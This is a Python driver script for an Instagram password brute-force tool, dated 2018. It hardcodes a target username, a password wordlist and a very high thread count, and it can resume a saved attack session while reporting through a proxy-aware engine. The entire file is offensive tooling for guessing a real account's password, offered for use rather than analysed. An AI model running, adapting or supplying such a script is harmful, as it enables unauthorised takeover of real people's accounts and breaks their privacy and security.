# Date: 05/05/2018
# Author: Pure-L0G1C
# Description: Bruteforce Instagram

from time import sleep 
from os.path import exists
from sys import exit, version 
from lib.bruter import Bruter 
from lib.session import Session 
from argparse import ArgumentParser

def _input(msg):
 return raw_input(msg).lower() if int(version.split()[0].split('.')[0]) == 2 else input(msg).lower()

def main():

 username = "zomboid333"
 wordlist = "password_1.txt"
 threads = "999999" 

 # assign variables
 engine = Bruter(username.title(), int(threads), wordlist)
 session = Session(username.title(), wordlist)

 if session.exists():
  if _input('Do you want to resume the attack? [y/n]: ').split()[0][0] == 'y':
   data = session.read()
   if data:
    engine.attempts = int(data['attempts'])
    engine.passlist.queue = eval(data['queue'])
    engine.retrieve = True

 # start attack
 try:
  engine.start()
 except KeyboardInterrupt:
  engine.user_abort = True 
 finally:
  if all([engine.spyder.proxy_info, not engine.isFound]):
   engine.display(engine.pwd)

  if all([not engine.read, engine.user_abort, not engine.isFound]):
   print('{}[!] Exiting ...'.format('' if not engine.spyder.proxy_info else '\n'))

  if all([engine.read, not engine.isFound]):
   print('\n[*] Password not found')

  sleep(1.5)
  engine.stop()

if __name__ == '__main__':
 main()